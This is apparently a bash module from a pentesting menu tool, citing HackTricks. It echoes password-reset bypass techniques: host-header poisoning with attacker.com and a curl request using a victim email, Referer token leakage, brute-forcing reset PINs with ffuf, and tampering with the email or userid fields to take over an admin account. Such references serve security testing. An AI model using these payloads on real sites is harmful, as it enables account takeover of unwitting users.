#!/bin/bash
# HackTricks Ref: reset-password.md
# Module: Password Reset Bypass & Poisoning

echo -e "${C6}[WEB ATTACK: RESET_PASSWORD_BYPASS]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/reset-password"
echo -e "--------------------------------------------------"

echo -e "${C4}Select Bypass Technique:${NC}"
echo "1) Host Header Injection (Reset Link Poisoning)"
echo "2) Token Leakage (Referer Header / URL)"
echo "3) Token Brute-Force & Predictability"
echo "4) Parameter Tampering (Email/ID change)"
echo "5) Session/Token Reuse after Password Change"
echo "0) Exit"

read -p "Selection: " reset_opt

case $reset_opt in
    1)
        echo -e "\n${C2}[*] Host Header Injection:${NC}"
        echo "Try to force the server to send the reset email with YOUR domain."
        echo "Modify the POST /forgot-password request:"
        echo " - Host: attacker.com"
        echo " - X-Forwarded-Host: attacker.com"
        echo " - X-Forwarded-Server: attacker.com"
        echo "Example: curl -H \"Host: evil.com\" -X POST -d \"email=victim@target.com\" https://target.com/reset"
        ;;
    2)
        echo -e "\n${C2}[*] Token Leakage via Referer:${NC}"
        echo "1. Request a password reset for your own account."
        echo "2. Click the link in email, but once on the site, click an external link (e.g., Twitter/FB icon)."
        echo "3. Check if the 'Referer' header sent to the external site contains the reset token."
        echo "URL Example: https://attacker.com/analytics?ref=https://target.com/reset?token=XYZ"
        ;;
    3)
        echo -e "\n${C2}[*] Token Predictability:${NC}"
        echo " - Check if the token is a simple Timestamp (Base64 encoded)."
        echo " - Check if it's based on 'md5(email)' or 'md5(id)'."
        echo " - If it's a 4-6 digit PIN, use 'ffuf' to brute-force the /verify-token endpoint."
        ;;
    4)
        echo -e "\n${C2}[*] Parameter Tampering:${NC}"
        echo "During the final 'Set New Password' POST request, try to change the target:"
        echo " - Change: {\"token\":\"XYZ\", \"new_pass\":\"123\"}"
        echo " - To:     {\"token\":\"XYZ\", \"new_pass\":\"123\", \"email\":\"admin@target.com\"}"
        echo " - Or:     {\"token\":\"XYZ\", \"new_pass\":\"123\", \"userid\":\"1\"}"
        ;;
    5)
        echo -e "\n${C2}[*] Token/Session Persistence:${NC}"
        echo " - Does the old password still work after a reset?"
        echo " - Does the reset token work more than once?"
        echo " - Are all other active sessions (mobile, other PCs) logged out after the reset?"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
